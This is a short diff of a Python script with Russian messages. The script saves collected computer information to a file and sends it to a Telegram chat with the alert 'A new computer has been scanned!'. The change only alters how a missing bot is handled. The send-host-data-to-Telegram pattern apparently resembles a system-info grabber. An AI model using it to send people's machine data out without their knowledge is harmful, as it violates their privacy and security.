@@ -123,14 +123,10 @@ with open('computer_info.txt', 'a', encoding='utf-8') as file:
     file.write(text)
 
 print("Отправка сообщения через Telegram...")
-if bot:
-    try:
-        bot.send_message(user_id, "*Был просканирован новый компьютер!*", parse_mode="Markdown")
-        bot.send_message(user_id, text)
-    except Exception as e:
-        print(f"Ошибка отправки сообщения в Telegram: {e}")
-else:
-    print("Бот не инициализирован, отправка отменена")
-
+try:
+    bot.send_message(user_id, "*Был просканирован новый компьютер!*", parse_mode="Markdown")
+    bot.send_message(user_id, text)
+except Exception as e:
+    print("Сообщение не отправлено, бот отключён..")
 print("Процесс завершен.")
 input("Нажмите для выхода")
